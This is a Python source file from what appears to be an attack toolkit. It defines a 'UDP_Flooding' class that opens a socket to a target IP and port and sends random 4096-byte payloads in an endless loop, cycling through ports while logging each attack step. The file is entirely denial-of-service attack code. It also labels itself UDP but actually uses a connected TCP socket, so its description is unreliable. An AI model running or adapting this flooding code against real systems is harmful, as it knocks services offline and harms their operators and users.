#!/usr/bin/python
import src.source.use
from src.Logging.print_stdout import print_error, print_warning, print_process

class UDP_Flooding:
    def __init__(self, ip_address, port_address):
        self.ip_address = ip_address
        self.port_address = int(port_address)
        if not self.ip_address:
            print_warning("Please input the ip address target!")
            src.source.use.sys.exit()
        if not self.port_address:
            print_warning("Please input port address!")
            src.source.use.sys.exit()

    def main(self):
        print
        print_process(
                "Starting Flooding on {host} at {time}".format(
                host=self.ip_address, 
                time=src.source.use.time.strftime("%H:%M:%S")
            )
        )
        src.source.use.time.sleep(1)
        try:
            byte = src.source.use.random._urandom(4096)
            sock = src.source.use.socket.socket(
                src.source.use.socket.AF_INET, src.source.use.socket.SOCK_STREAM
            )
            sock.connect((self.ip_address, self.port_address))
            sent = 0
            try:
                while True:
                    sock.sendto(byte,(self.ip_address, self.port_address))
                    sent = sent + 1
                    self.port_address = self.port_address + 1
                    print_process(
                            "Attacking Flooding send {p} bytes on {host}:{port}".format(
                            p=sent, 
                            host=self.ip_address, 
                            port=self.port_address
                        )
                    )
                    if self.port_address == 65535:
                        self.port_address = 1
            except KeyboardInterrupt:
                print_error("Stop process... Exiting...")
                src.source.use.time.sleep(1)
        except src.source.use.socket.error as error:
            print_error(str(error))